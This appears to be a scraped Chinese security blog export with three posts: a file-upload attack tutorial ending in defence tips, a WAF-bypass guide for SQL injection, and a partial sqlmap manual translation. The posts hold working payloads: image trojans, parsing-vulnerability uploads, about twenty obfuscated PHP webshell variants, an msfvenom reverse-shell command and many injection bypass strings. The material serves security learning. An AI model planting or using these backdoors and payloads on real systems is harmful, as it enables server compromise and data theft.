E0 00 10 4A 46 49 46 GIF 47 49 46 38 39 61 PNG 89 50 4E 47 Windows Bitmap (bmp) 42 4D TIFF (tif) 49 49 2A 00 CAD (dwg) 41 43 31 30 Adobe Photoshop (psd) 38425053 Rich Text Format (rtf) 7B5C727466 MS Word/Excel (xls.or.doc) D0CF11E0 MS Access (mdb) 5374616E64617264204A ZIP Archive (zip) 504B0304 RAR Archive (rar) 52617221 Wave (wav) 57415645 AVI (avi) 41564920 Real Media (rm) 2E524D46 MPEG (mpg) 000001BA MPEG (mpg) 000001B3 Quicktime (mov) 6D6F6F76 Adobe Acrobat (pdf) 255044462D312E Windows Media (asf) 3026B2758E66CF11 MIDI (mid) 4D546864 生成图片木马 1copy test.jpg/b+test.php/a shell.jpg 使用edjpgcom.exe 将图片拖拽到.exe上 需要和其他漏洞(解析漏洞、文件包含)结合使用 4.2.5 文件渲染检测调用API 或函数去进行文件加载测试常见的是图像渲染测试，再变态点的甚至是进行二次渲染(后面会提到) 对文件加载检测的攻击一般就两种方式，一个是渲染测试绕过，另一个是攻击文件加载器自身。 4.2.5.1 渲染测试绕过先用 GIMP 对一张图片进行代码注入 用 winhex 看数据可以分析出这类工具的原理是 在不破坏文件本身的渲染情况下找一个空白区进行填充代码 一般是图片的注释区 upload-labs第16关 4.2.5.2 攻击文件加载器二次渲染基本上没法绕过，只能对文件加载器进行攻击二次渲染相当于是把原本属于图像数据的部分选取出来，再用API 或函数进行重新渲染，在这个过程中非图像数据的部分直接就隔离开了 对文件加载器进行攻击，常见的就是溢出攻击，上传恶意文件后，服务上的文件加载器进行加载测试时，被触发攻击执行shellcode比如 access/mdb 溢出(Microsoft Jet Engine MDB File溢出的漏洞，该漏洞是由于access在加载mdb文件时，处理不当，产生的shellcode执行，参考链接:https://blog.csdn.net/kendyhj9999/article/details/18738435) Magic image 4.2.6 条件竞争线程编程中，为了保证数据操作的一致性，操作系统引入了锁机制，用于保证临界区代码的安全。通过锁机制，能够保证在多核多线程环境中，在某一个时间点上，只能有一个线程进入临界区代码，从而保证临界区中操作数据的一致性。 临界区指的是一个访问共用资源（例如：共用设备或是共用存储器）的程序片段，而这些共用资源又无法同时被多个线程访问的特性。 竞争条件发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。 upload-labs第17关 4.2.7 写提交按钮有些上传页面没有提交按钮，可以用HTML编辑From表单，添加提交按钮 5. 解析漏洞 5.1 IIS5.1.1 版本：5.x-6.x目录解析漏洞：以asp/asa等结尾的目录，其目录下的文件均可被解析 文件名解析漏洞：以.asp/asa;*.png或;*.jpg结尾的文件均可被解析 IIS应用层漏洞：以asa、cer、cdx结尾的文件均可被解析 5.1.2 版本：7.5(配置不当引起)在当前文件中，有IIS能够解析的扩展名(asp/aspx)，这个文件可被解析 a.aspx.a a.aspx.jpg.jpg…jpg 5.1.3 版本：IIS 7.0/IIS 7.5在默认Fast-CGI开启状况下,上传一个名字为wooyun.jpg，内容为 1&lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[cmd])?&gt;&apos;);?&gt; 的文件，然后访问wooyun.jpg/.php,在这个目录下就会生成一句话木马 shell.php x.asp%00.jpg 5.1.4 IIS PUT写入漏洞服务器配置不当造成，因为开启Webdav，使应用程序可直接对Web Server进行读写，同时IIS中又配置目录可写，便产生很严重的问题。 5.2 Apache5.2.1 文件名移位解析原理：Apache在解析文件过程中，从右向左开始判断后缀名，遇到不认识的后缀名，会向左移动一位再做判断 test.php.php123.cdd 先解析.cdd不认识，再解析.php123，再解析php 服务器本身的漏洞 5.2.2 文件名中包含PHP就会解析(配置不当)再配置文件中添加一行配置： 1AddHander php5-script .php test2.php.jpg 5.2.3 添加扩展名(配置不当)1AddType application/x-httpd-php .jpg 即使是.jpg文件也能被解析 5.3 Nginx5.3.1 版本&lt;8.0.3 畸形解析漏洞在默认Fast-CGI开启状况下,上传一个名字为wooyun.jpg，内容为 1&lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[cmd])?&gt;&apos;);?&gt; 的文件，然后访问wooyun.jpg/.php,在这个目录下就会生成一句话木马 shell.php 5.3.2 版本&lt;8.0.3 空字节代码执行漏洞上传文件是图片木马，在访问时，URL中图片后缀名后面加上%00.php可以正常解析 xxx.jpg%00.php 5.3.3 fix_pathinfo(配置不当)在配置文件中设置fix_pathinfo这个参数(开启，并设置相应的值)，服务器中就会出现各种解析漏洞(CGI解析漏洞) 123/1.jpg/1.php/1.jpg%00.php/1.jpg/%20\\1.php 6. Getshell条件6.1 木马可上传可直接解析的后缀名、图片木马 6.2 木马可解析后缀名可直接解析，知道文件的路径 图片木马 结合其他漏洞(解析漏洞或文件包含)，知道文件路径 6.3 木马可访问文件路径获取方法： 上传正常图片，并且显示该图片，直接看图片路径扫目录信息泄露--列目录 7.一句话木马变形7.1 使用字符串隐藏assert、eval等函数1$a =str_replace(&quot;x&quot;,&quot;&quot;,”axsxxsxexrxxt”);$a($_POST[“code”]); 用字符串隐藏assert方法，并且利用它加上动态传入参数的方式构造后门。 7.2 将函数和执行命令都作为请求参数123$_GET[‘a’]($_GET[‘b’]);?a=assert&amp;b=phpinfo();完全利用动态参数传入的方式构造后门，将敏感函数和执行的命令动态传入，效果如变形二。 7.3 preg_replace函数12($code = $_POST[‘code’]) &amp;&amp; @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).&apos;($code)’, ‘add’); 7.4 自定义函数1234$fun=creat_function(&apos;&apos;,$_POST[&apos;a&apos;]);$fun();a=phpinfo(); 7.5 回调函数 call_user_func()1@call_user_func(assert,$_POST[&apos;a&apos;]); 7.6 file_put_contents函数1234&lt;?php$test=&apos;&lt;?php $a=$_POST[&quot;cmd&quot;];assert($a); ?&gt;&apos;;file_put_contents(&quot;shell.php&quot;, $test);?&gt; 7.7 PHP变量函数1234&lt;?php $a = &quot;eval&quot;;$a(@$_POST[&apos;a&apos;]); ?&gt; 7.8 PHP可变变量12345&lt;?php$bb=&quot;eval&quot;;$a=&quot;bb&quot;;$$a($_POST[&apos;a&apos;]);?&gt; 7.9 str_replace函数1234&lt;?php$a=str_replace(&quot;Waldo&quot;, &quot;&quot;, &quot;aWaldossert&quot;);$a(@$_POST[&apos;a&apos;]);?&gt; 7.10 base64_decode函数12345base64_decode函数&lt;?php$a=base64_decode(&quot;ZXZhbA==&quot;)$a($_POST[&apos;a&apos;]);?&gt; 7.11 .操作符123456&lt;?php$a=&quot;e&quot;.&quot;v&quot;;$b=&quot;a&quot;.&quot;l&quot;;$c=$a.$b;$c($_POST[&apos;a&apos;]);?&gt; 7.12 parse_str函数，将查询字符串解析到变量中123456&lt;?php$str=&quot;a=eval&quot;;parse_str($str);//$a=eval$a($_POST[&apos;a&apos;]);?&gt; 7.13 array_filter函数，用回调函数过滤数组中的元素123$e=$_REQUEST[&apos;e&apos;];$arr = array($_POST[&apos;pass&apos;],);array_map($e, $arr); eval不能回调，assert可以 使用菜刀连接 \\e=assert\\ 7.14 array_map函数将函数作用到数组中的每个值上，做相应的处理，并返回带有新值的数组： 123$e = $_REQUEST[&apos;e&apos;];$arr = array($_POST[&apos;pass&apos;],);array_map($e, $arr); 7.15 uasort函数使用自定义的比较函数对数组$arr中的元素按键值进行排序 123$e=$_REQUEST[&apos;e&apos;];$arr=array(&apos;test&apos;,$_REQUEST[&apos;pass&apos;]);uasort($arr,$e); PHP版本&gt;5.4 7.16 加密类变形12345678910111213if(isset($_POST[&apos;com&apos;])&amp;&amp;md5($_POST[&apos;com&apos;])== &apos;202cb962ac59075b964b07152d234b70&apos;&amp;&amp; isset($_POST[&apos;content&apos;])) $content = strtr($_POST[&apos;content&apos;], &apos;-_,&apos;, &apos;+/=&apos;);eval(base64_decode($content));eval($_POST[&quot;cmd&quot;])http://www.target.com/shell.php cmdcontent=JF9QT1NUWyJjbWQiXQ== com=123 7.17 变量拼接类变形12&lt;?php $sF=&quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[&apos;n985de9&apos;];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt; 7.18 加密拼接1&lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF(&quot;&quot;,$_cC);@$_();?&gt; 1234567891011121314&lt;?$__C_C=&quot;WlhaaGJDZ2tYMUJQVTFSYmVGMHBPdz09&quot;;$__P_P=&quot;abcdefghijklmnopqrstuvwxyz&quot;;$__X_X=&quot;123456789&quot;;$__O_O=$__X_X[5].$__X_X[3].&quot;_&quot;;$__B_B=$__P_P&#123;1&#125;.$__P_P[0].$__P_P[18].$__P_P[4];$__H_H=$__B_B.$__O_O.$__P_P[3].$__P_P[4].$__P_P[2].$__P_P[14].$__P_P[3].$__P_P[4];$__E_E=$__P_P[4].$__P_P[21].$__P_P[0].$__P_P[11];$__F_F=$__P_P[2].$__P_P[17].$__P_P[4].$__P_P[0].$__P_P[19].$__P_P[4];$__F_F.=&apos;_&apos;.$__P_P[5].$__P_P[20].$__P_P[13].$__P_P[2].$__P_P[19].$__P_P[8].$__P_P[14].$__P_P[13];$_[00]=$__F_F(&apos;$__S_S&apos;,$__E_E.&apos;(&quot;$__S_S&quot;);&apos;);@$_[00]($__H_H($__H_H($__C_C)));//解码后即==&gt; eval($_POST[x]);?&gt; 7.19 MSF生成网页木马1.生成木马 1msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.126.126 lport=12600 -f raw &gt;./shell.php 12345set payload php/meterpreter/reverse_tcpshow optionsset lhostset lportexploit -j 7.20 Weevely生成网页木马1python weevely.py generate password path 终端 1python weevely.py url password 8. 文件上传防御1.使用白名单限制上传类型黑名单可以使用各种方法进行绕过 2.使用最新版本的IIS、Apache、Nginx 3.对上传文件名进行改写 4.检查HTTP Header中的Content-Type、检查文件上传路径 5.分析文件头和文件尾 6.对图片进行渲染，最好二次渲染，并对API和函数进行加固，防止溢出 7.设置文件夹权限根据需求将文件上传的目录设置为不可执行 8.尽可能让上传的文件的路径不可知，将路径保存到数据库中，在需要的时候再进行读取 9.限制上传文件的大小 10.单独设置文件服务器的域名 9. 参考[1] Web条件竞争 [2] 解析漏洞整理 [3] 文件上传漏洞是什么？要怎样防御文件上传的漏洞攻击？","categories":[],"tags":[]},{"title":"'绕过WAF(自闭教程)'","slug":"Play-with-WAF","date":"2019-04-17T12:46:23.000Z","updated":"2019-04-28T03:03:22.363Z","comments":true,"path":"2019/04/17/Play-with-WAF/","link":"","permalink":"https://chirec.github.io/2019/04/17/Play-with-WAF/","excerpt":"1. WAF1.1 WAF介绍WAF是Web Application Firewall的简称。中文名为Web应用防护系统，也称网站应用级入侵防御系统。","text":"1. WAF1.1 WAF介绍WAF是Web Application Firewall的简称。中文名为Web应用防护系统，也称网站应用级入侵防御系统。 1.2 WAF作用1.2.1 网络层防护拦截DDOS攻击、防御SYN Flood、防御Ack Flood、防御Http/Https Flood 1.2.2 应用层防护URL黑白名单、HTTP协议规范、防御注入攻击、防御XSS攻击、防御XXE 1.3 分类代码WAF：规则写在代码中 软件WAF：实时监听端口(服务) 硬件WAF：专门的硬件设备 代理流量 分析流量 网络镜像 云WAF：流量传到检测节点中做检测 1.4 工作流程1.4.1 身份验证白名单(IP、cookie、useragent、referer)黑名单 1.4.2 数据包解析1.4.3 匹配规则ACL(访问控制列表) 2.Bypass常用方法2.1 大小写1select * from users where id=&apos;1 &apos; uNion SelEct 1,2,3,4 --+ 2.2 替换关键字(关键字重复写)1select * from users where id=1 ununionion selselectect 2.3 编码2.3.1 URL编码1select * from users where id=1 %75nion select 2.3.2 二次URL编码将URL编码两次 2.3.3 错误URL编码12union select password from users where id=1u%nion sel%ect password fr%om users wh%ere id=1 在注入关键词处加上%，WAF会将其取出 2.3.4 Unicode编码12union select password from users where id=1%u0075%u006e%u0069%u006f%u006e select password from users where id=1 Unicode编码 2.3.5 Nibble编码Nibble编码是针对URL编码的%后两位进行二次编码的一种方法。根据编码位置不同，被分为First Nibble、Second Nibble以及Double Nibble三种。 Type Transformation of %61 Result First Nibble 6 = %36 %%361 Second Nibble 1 = %31 %6%31 Double Nibble 6 = %36 1 = %31 %%36%31 2.3.6错误16进制编码 Hex Character Conversion Decimal %61 6*16+1 97 %2ú 2*16+65 97 2.4 内联注释/* */ 1select * from users where id=1 union/**/ 2.5 等价函数替换123version @@versionmid substr substring@@datadir datadir() 2.6 特殊符号123456789101112+#%23--+\\\\\\\\||select`version()`@ 用户自定义变量@@ 系统变量se||lect%df宽字节注释符+%0a绕过 2.7 内联注释加！1/*!union*/ 2.8 缓冲区溢出1?id=1 and (select 1)=(select 0xAAAAAAAAAAAA*1000) union select 1,2 verion(),4,5,database(),8,9,10,11,12,13,14,15,16,17,18 0xA*1000指有1000个A 2.9 mysql特性绕过123= 等于:= 赋值@ @+变量名可直接调用 2.10 隐私类型转换12select &apos;a&apos;=0;select &apos;1admin&apos;=1; 2.11 综合探索内联注释黑魔法 1select&#123;x user&#125;from&#123;x mysql.user&#125; 换行符绕过：%23%0a %2d%2d%0a 12select * from admin where id=1[1] union [2]select [3]1,user()[4]from[5]admin//[]表示检测点 2.11.1[1]： 1/**/ /*!50000union*/ 12空白 %09 %0a %0b %0c %0d %20id=1%0bunion select 1,user() from admin 12浮点数形式id=1.0union select 1,user() from admin 121E0id=1E0union select 1,user() from admin 12\\id=\\Nunion select 1,user() from admin 2.11.2[2]： 1空白 1注释符 12括号id=1 union(select &apos;test&apos;,(select user()from admin limit 0,1)) 2.11.3[3]： 1空白 1注释符 1234567其他字符！ %21+ %2b- %2d@ %40~ %7eid=1 union select~1,user(),version() from admin 12括号id=1 union select(1),user(),version() from admin 12内联注释id=1 union /*!500000select*/ 1,user(),version() from admin 12&#123;&#125;id=1 union select&#123;x 1&#125;,user(),version() from admin 12&quot;&quot;id=1 union select&quot;1&quot;,user(),version() from admin 12\\Nid=1 union select\\N,user(),version() from admin 2.11.4[4]： 1空白 1注释符 123其他字符` %60id=1 union select 1,user(),version()`from admin` 1内联注释 1括号 12加字母id=1 union select 1,user(),version()Afrom admin 1浮点数、1E0、\\N 2.11.5[5]： 1空白 1注释符 123其他符号中文破折号id=1 union select 1,user(),version() from——admin 1内联注释 12&#123;&#125;id=1 union select 1,user(),version() from&#123;x admin&#125; 1() 1 2 2 1 2 2 1 2 2 2.12 空白 RDBMS Allowed whitespaces SQLite 3 0A,0D,0C,09,20 MySQL 5 09,0A,0B,0C,0D,A0,20 Oracle 11g 00,09,0A,0B,0C,0D,20 MSSQL 2008 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20,25 2.13 特殊位置代替空格科学计数法(1e0,.)数学计算(+-*/)特殊字符(\\N)注释符(/**/) 2.14 无空格的查询1?id=1e0and&#123;``select(left(database(),1))&#125; 3. 基于HTTP协议的绕过方式OWASP AppSec EuropeWAF Bypass Techniques-Using HTTP Standard and Web Servers’ Behaviour -- Soroush Dalili来源：漏洞银行丨一般人我不告诉的WAF绕过新姿势-1337G丨咖面74期 3.1 基于HTTP0.9协议的绕过方式3.2 HTTP隧道传输/HTTP pipline 通过BP拦包，在一个请求下添加多个请求，注意需要修改 12Connection:keep-aliveContent-Length: 3.3 畸形包 由于c=2&amp;d=2后面的内容WAF并能不识别，所以GET后面的Payload没有被WAF拦截掉 3.4 分块传输/Chunked Transfer通过使用HTTP头Transfer-Encoding:chunked设置达到分割参数的效果在HTTP/1.1下使用 奇数行表示下一行的数据长度，使用16机制表示偶数行表示传输的数据在最后一行写0，并在0后写入多个回车0后没有回车会没有响应 3.5 协议未覆盖以下四种常见的content-type类型，我们可以尝试互相替换尝试绕过WAF过滤机制。 1234Content-Type:text/html;charset=UTF-8Content-Type:application/json;charset=utf-8Content-Type:application/x-www-form-urlencoded;charset=utf-8Content-Type:multipart/form-data;boundary=something 注：如图常见的绕过方式为使用multipart/form-data标签，并把name设为参数名内容写入注入语句。 .参考[1] 漏洞银行丨一般人我不告诉的WAF绕过新姿势-1337G丨咖面74期 [2] Additional notes on “A Forgotten HTTP Invisibility Cloak” talk!","categories":[],"tags":[]},{"title":"'Sqlmap使用手册(未完成)'","slug":"Sqlmap-Usage","date":"2019-04-14T09:03:02.000Z","updated":"2019-04-14T12:21:56.575Z","comments":true,"path":"2019/04/14/Sqlmap-Usage/","link":"","permalink":"https://chirec.github.io/2019/04/14/Sqlmap-Usage/","excerpt":"为了更好的学习sqlmap，尝试看官方文档并翻译官方文档。由于对网络方面的单词不熟悉而且英文水平有限，所以翻译并不准确。","text":"为了更好的学习sqlmap，尝试看官方文档并翻译官方文档。由于对网络方面的单词不熟悉而且英文水平有限，所以翻译并不准确。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259Usage: python sqlmap.py [options]Options: -h, --help Show basic help message and exit -hh Show advanced help message and exit --version Show program&apos;s version number and exit -v VERBOSE Verbosity level: 0-6 (default 1) Target: At least one of these options has to be provided to define the target(s) -d DIRECT Connection string for direct database connection -u URL, --url=URL Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;) -l LOGFILE Parse target(s) from Burp or WebScarab proxy log file -x SITEMAPURL Parse target(s) from remote sitemap(.xml) file -m BULKFILE Scan multiple targets given in a textual file -r REQUESTFILE Load HTTP request from a file -g GOOGLEDORK Process Google dork results as target URLs -c CONFIGFILE Load options from a configuration INI file Request: These options can be used to specify how to connect to the target URL --method=METHOD Force usage of given HTTP method (e.g. PUT) --data=DATA Data string to be sent through POST (e.g. &quot;id=1&quot;) --param-del=PARA.. Character used for splitting parameter values (e.g. &amp;) --cookie=COOKIE HTTP Cookie header value (e.g. &quot;PHPSESSID=a8d127e..&quot;) --cookie-del=COO.. Character used for splitting cookie values (e.g. ;) --load-cookies=L.. File containing cookies in Netscape/wget format --drop-set-cookie Ignore Set-Cookie header from response --user-agent=AGENT HTTP User-Agent header value --random-agent Use randomly selected HTTP User-Agent header value --host=HOST HTTP Host header value --referer=REFERER HTTP Referer header value -H HEADER, --hea.. Extra header (e.g. &quot;X-Forwarded-For: 127.0.0.1&quot;) --headers=HEADERS Extra headers (e.g. &quot;Accept-Language: fr\\nETag: 123&quot;) --auth-type=AUTH.. HTTP authentication type (Basic, Digest, NTLM or PKI) --auth-cred=AUTH.. HTTP authentication credentials (name:password) --auth-file=AUTH.. HTTP authentication PEM cert/private key file --ignore-code=IG.. Ignore (problematic) HTTP error code (e.g. 401) --ignore-proxy Ignore system default proxy settings --ignore-redirects Ignore redirection attempts --ignore-timeouts Ignore connection timeouts --proxy=PROXY Use a proxy to connect to the target URL --proxy-cred=PRO.. Proxy authentication credentials (name:password) --proxy-file=PRO.. Load proxy list from a file --tor Use Tor anonymity network --tor-port=TORPORT Set Tor proxy port other than default --tor-type=TORTYPE Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default)) --check-tor Check to see if Tor is used properly --delay=DELAY Delay in seconds between each HTTP request --timeout=TIMEOUT Seconds to wait before timeout connection (default 30) --retries=RETRIES Retries when the connection timeouts (default 3) --randomize=RPARAM Randomly change value for given parameter(s) --safe-url=SAFEURL URL address to visit frequently during testing --safe-post=SAFE.. POST data to send to a safe URL --safe-req=SAFER.. Load safe HTTP request from a file --safe-freq=SAFE.. Test requests between two visits to a given safe URL --skip-urlencode Skip URL encoding of payload data --csrf-token=CSR.. Parameter used to hold anti-CSRF token --csrf-url=CSRFURL URL address to visit for extraction of anti-CSRF token --force-ssl Force usage of SSL/HTTPS --hpp Use HTTP parameter pollution method --eval=EVALCODE Evaluate provided Python code before the request (e.g. &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;) Optimization: These options can be used to optimize the performance of sqlmap -o Turn on all optimization switches --predict-output Predict common queries output --keep-alive Use persistent HTTP(s) connections --null-connection Retrieve page length without actual HTTP response body --threads=THREADS Max number of concurrent HTTP(s) requests (default 1) Injection: These options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts -p TESTPARAMETER Testable parameter(s) --skip=SKIP Skip testing for given parameter(s) --skip-static Skip testing parameters that not appear to be dynamic --param-exclude=.. Regexp to exclude parameters from testing (e.g. &quot;ses&quot;) --dbms=DBMS Force back-end DBMS to provided value --dbms-cred=DBMS.. DBMS authentication credentials (user:password) --os=OS Force back-end DBMS operating system to provided value --invalid-bignum Use big numbers for invalidating values --invalid-logical Use logical operations for invalidating values --invalid-string Use random strings for invalidating values --no-cast Turn off payload casting mechanism --no-escape Turn off string escaping mechanism --prefix=PREFIX Injection payload prefix string --suffix=SUFFIX Injection payload suffix string --tamper=TAMPER Use given script(s) for tampering injection data Detection: These options can be used to customize the detection phase --level=LEVEL Level of tests to perform (1-5, default 1) --risk=RISK Risk of tests to perform (1-3, default 1) --string=STRING String to match when query is evaluated to True --not-string=NOT.. String to match when query is evaluated to False --regexp=REGEXP Regexp to match when query is evaluated to True --code=CODE HTTP code to match when query is evaluated to True --text-only Compare pages based only on the textual content --titles Compare pages based only on their titles Techniques: These options can be used to tweak testing of specific SQL injection techniques --technique=TECH SQL injection techniques to use (default &quot;BEUSTQ&quot;) --time-sec=TIMESEC Seconds to delay the DBMS response (default 5) --union-cols=UCOLS Range of columns to test for UNION query SQL injection --union-char=UCHAR Character to use for bruteforcing number of columns --union-from=UFROM Table to use in FROM part of UNION query SQL injection --dns-domain=DNS.. Domain name used for DNS exfiltration attack --second-url=SEC.. Resulting page URL searched for second-order response --second-req=SEC.. Load second-order HTTP request from file Fingerprint: -f, --fingerprint Perform an extensive DBMS version fingerprint Enumeration: These options can be used to enumerate the back-end database management system information, structure and data contained in the tables. Moreover you can run your own SQL statements -a, --all Retrieve everything -b, --banner Retrieve DBMS banner --current-user Retrieve DBMS current user --current-db Retrieve DBMS current database --hostname Retrieve DBMS server hostname --is-dba Detect if the DBMS current user is DBA --users Enumerate DBMS users --passwords Enumerate DBMS users password hashes --privileges Enumerate DBMS users privileges --roles Enumerate DBMS users roles --dbs Enumerate DBMS databases --tables Enumerate DBMS database tables --columns Enumerate DBMS database table columns --schema Enumerate DBMS schema --count Retrieve number of entries for table(s) --dump Dump DBMS database table entries --dump-all Dump all DBMS databases tables entries --search Search column(s), table(s) and/or database name(s) --comments Check for DBMS comments during enumeration -D DB DBMS database to enumerate -T TBL DBMS database table(s) to enumerate -C COL DBMS database table column(s) to enumerate -X EXCLUDE DBMS database identifier(s) to not enumerate -U USER DBMS user to enumerate --exclude-sysdbs Exclude DBMS system databases when enumerating tables --pivot-column=P.. Pivot column name --where=DUMPWHERE Use WHERE condition while table dumping --start=LIMITSTART First dump table entry to retrieve --stop=LIMITSTOP Last dump table entry to retrieve --first=FIRSTCHAR First query output word character to retrieve --last=LASTCHAR Last query output word character to retrieve --sql-query=QUERY SQL statement to be executed --sql-shell Prompt for an interactive SQL shell --sql-file=SQLFILE Execute SQL statements from given file(s) Brute force: These options can be used to run brute force checks --common-tables Check existence of common tables --common-columns Check existence of common columns User-defined function injection: These options can be used to create custom user-defined functions --udf-inject Inject custom user-defined functions --shared-lib=SHLIB Local path of the shared library File system access: These options can be used to access the back-end database management system underlying file system --file-read=FILE.. Read a file from the back-end DBMS file system --file-write=FIL.. Write a local file on the back-end DBMS file system --file-dest=FILE.. Back-end DBMS absolute filepath to write to Operating system access: These options can be used to access the back-end database management system underlying operating system --os-cmd=OSCMD Execute an operating system command --os-shell Prompt for an interactive operating system shell --os-pwn Prompt for an OOB shell, Meterpreter or VNC --os-smbrelay One click prompt for an OOB shell, Meterpreter or VNC --os-bof Stored procedure buffer overflow exploitation --priv-esc Database process user privilege escalation --msf-path=MSFPATH Local path where Metasploit Framework is installed --tmp-path=TMPPATH Remote absolute path of temporary files directory Windows registry access: These options can be used to access the back-end database management system Windows registry --reg-read Read a Windows registry key value --reg-add Write a Windows registry key value data --reg-del Delete a Windows registry key value --reg-key=REGKEY Windows registry key --reg-value=REGVAL Windows registry key value --reg-data=REGDATA Windows registry key value data --reg-type=REGTYPE Windows registry key value type General: These options can be used to set some general working parameters -s SESSIONFILE Load session from a stored (.sqlite) file -t TRAFFICFILE Log all HTTP traffic into a textual file --batch Never ask for user input, use the default behavior --binary-fields=.. Result fields having binary values (e.g. &quot;digest&quot;) --check-internet Check Internet connection before assessing the target --crawl=CRAWLDEPTH Crawl the website starting from the target URL --crawl-exclude=.. Regexp to exclude pages from crawling (e.g. &quot;logout&quot;) --csv-del=CSVDEL Delimiting character used in CSV output (default &quot;,&quot;) --charset=CHARSET Blind SQL injection charset (e.g. &quot;0123456789abcdef&quot;) --dump-format=DU.. Format of dumped data (CSV (default), HTML or SQLITE) --encoding=ENCOD.. Character encoding used for data retrieval (e.g. GBK) --eta Display for each output the estimated time of arrival --flush-session Flush session files for current target --forms Parse and test forms on target URL --fresh-queries Ignore query results stored in session file --har=HARFILE Log all HTTP traffic into a HAR file --hex Use hex conversion during data retrieval --output-dir=OUT.. Custom output directory path --parse-errors Parse and display DBMS error messages from responses --preprocess=PRE.. Use given script(s) for preprocessing of response data --repair Redump entries having unknown character marker (?) --save=SAVECONFIG Save options to a configuration INI file --scope=SCOPE Regexp to filter targets from provided proxy log --test-filter=TE.. Select tests by payloads and/or titles (e.g. ROW) --test-skip=TEST.. Skip tests by payloads and/or titles (e.g. BENCHMARK) --update Update sqlmap Miscellaneous: -z MNEMONICS Use short mnemonics (e.g. &quot;flu,bat,ban,tec=EU&quot;) --alert=ALERT Run host OS command(s) when SQL injection is found --answers=ANSWERS Set predefined answers (e.g. &quot;quit=N,follow=N&quot;) --beep Beep on question and/or when SQL injection is found --cleanup Clean up the DBMS from sqlmap specific UDF and tables --dependencies Check for missing (optional) sqlmap dependencies --disable-coloring Disable console output coloring --gpage=GOOGLEPAGE Use Google dork results from specified page number --identify-waf Make a thorough testing for a WAF/IPS protection --list-tampers Display list of available tamper scripts --mobile Imitate smartphone through HTTP User-Agent header --offline Work in offline mode (only use session data) --purge Safely remove all content from sqlmap data directory --skip-waf Skip heuristic detection of WAF/IPS protection --smart Conduct thorough tests only if positive heuristic(s) --sqlmap-shell Prompt for an interactive sqlmap shell --tmp-dir=TMPDIR Local directory for storing temporary files --web-root=WEBROOT Web server document root directory (e.g. &quot;/var/www&quot;) --wizard Simple wizard interface for beginner users Output verbosity1-v 通过这个参数来设置输出文本的可见度。共有7个可见度等级，默认等级为1，在这个等级下，information,warning,error,critical messages and python tracebacks会被显示出来。 12345670、只显示python错误以及严重的信息。1、同时显示基本信息和警告信息。（默认）2、同时显示debug信息。3、同时显示注入的payload。4、同时显示HTTP请求。5、同时显示HTTP响应头。6、同时显示HTTP响应页面。 想理解sqlmap在后台做了些什么，等级2比较合适；想看到payload构造，等级3是最好的选择，如果你需要向开发者反馈潜在漏洞，同样推荐等级3，配合-t来保存日志文件；想要进一步查找潜在的bug或意想不到的行为，推荐等级4或更高等级；使用-v可以代替-v 2，-vv代替-v 3，-vvv代替-v 4，以此类推。 Target直接连接数据库1-d 使用sqlmap连接一个数据库，需要下面2种格式的连接字符串。 DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME (MySQL, Oracle, Microsoft SQL Server, PostgreSQL, etc.) DBMS://DATABASE_FILEPATH (SQLite, Microsoft Access, Firebird, etc.) For example: 1$ python sqlmap.py -d &quot;mysql://admin:admin@192.168.21.17:3306/testdb&quot; -f --banner --dbs --users 指定目标URL12-u--url 使用sqlmap测试目标URL，需要下面格式的URL http(s)://targeturl[:port]/[...] For example: 1$ python sqlmap.py -u http://www.target.com/vuln.php?id=1&quot; -f --banner --dbs --users 从Burp或WebScarab的代理日志中获取目标1-l 从Burp proxy和Web Scarab proxy的代理日志文件中解析出可能的攻击目标，参数后跟日志文件路径 从站点地图文件中获取目标1-x 为便于搜索引擎收录，许多网站专门为搜索引擎生成了xml格式的站点地图。Sqlmap可以直接解析xml格式的站点地图，从中提取攻击目标，对一个网站全方位无死角地进行注入检测。 For example: 1$ python sqlmap.py -x http://www.target.com/sitemap.xml 从文本文件中获取目标1-m 将多个目标URL写在一个文本文件中，sqlmap会按顺序扫描每个URL。 For example: 将待测URL写在urls.txt中，格式如下 123www.target1.com/vuln1.php?q=foobarwww.target2.com/vuln2.asp?id=1www.target3.com/vuln3/id/1* 运行sqlmap 1$ python sqlmap.py -m urls.txt 从文本文件中加载HTTP请求1-r 从文本文件中加载原始HTTP请求，这种方式可以让你跳过输入一些参数，如设置cookie，post数据等。可以使用BurpSuite抓包并保存HTTP请求文件 HTTP请求文件格式 12345POST /vuln.php HTTP/1.1Host: www.target.comUser-Agent: Mozilla/4.0id=1 